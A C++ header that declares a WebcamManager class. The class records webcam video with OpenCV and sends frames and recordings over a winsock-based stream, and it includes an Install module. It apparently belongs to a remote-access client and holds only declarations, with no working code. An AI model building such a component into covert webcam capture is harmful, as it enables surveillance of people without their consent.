#ifndef CLIENT_WEBCAMMANAGER_H
#define CLIENT_WEBCAMMANAGER_H
#include <winsock2.h>
#include <string>
#include <thread>
#include <opencv2/opencv.hpp>
#include "../stream/Stream.h"
#include "../time/Time.h"
#include "../install/Install.h"

class WebcamManager {
private:
    // information related to recording
    Stream stream;
    int webcamID;
    bool fragmented;
    int FPS;
    std::wstring locationOfVideos;
    // video and file managing
    cv::VideoWriter output;
    std::vector<std::wstring> pathVector;
    std::wstring fileName;
    boolean initialized = false;

    void sendRecord();
    void removeTempFiles();
    void sendFrame(const cv::Mat&);
    void sendDimensions(int,int);

public:
    WebcamManager(Stream stream, int webcamID, bool fragmented, int FPS,const std::string& locationOfVideos);
    void startWebcam();


};
#endif